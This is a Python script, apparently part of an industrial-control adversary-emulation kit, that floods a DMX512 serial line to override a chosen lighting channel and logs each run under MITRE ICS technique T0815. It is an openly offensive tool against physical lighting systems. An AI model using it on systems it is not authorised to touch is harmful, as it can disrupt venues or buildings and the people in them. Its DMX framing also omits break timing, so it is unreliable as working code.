#!/usr/bin/env python3

import serial
import argparse
import json
import os
from datetime import datetime
import time

LOG_FILE = "results/dmx_overrider_log.json"
MITRE_TTP = "T0815"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def override_dmx(port, channel, value, duration):
    try:
        ser = serial.Serial(port, 250000, timeout=1)
        for _ in range(duration * 10):  # send at 10Hz
            packet = bytearray([0] * 513)
            packet[0] = 0  # Start Code
            packet[channel] = value
            ser.write(packet)
            time.sleep(0.1)
        ser.close()
        return True
    except Exception as e:
        return False

def main():
    parser = argparse.ArgumentParser(description="DMX Lighting Channel Overrider")
    parser.add_argument("--port", required=True, help="DMX serial port (e.g. /dev/ttyUSB0)")
    parser.add_argument("--channel", type=int, required=True, help="DMX channel to override (1-512)")
    parser.add_argument("--value", type=int, default=255, help="DMX value (0-255)")
    parser.add_argument("--duration", type=int, default=5, help="Duration in seconds")
    args = parser.parse_args()

    success = override_dmx(args.port, args.channel, args.value, args.duration)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "port": args.port,
        "channel": args.channel,
        "value": args.value,
        "duration": args.duration,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
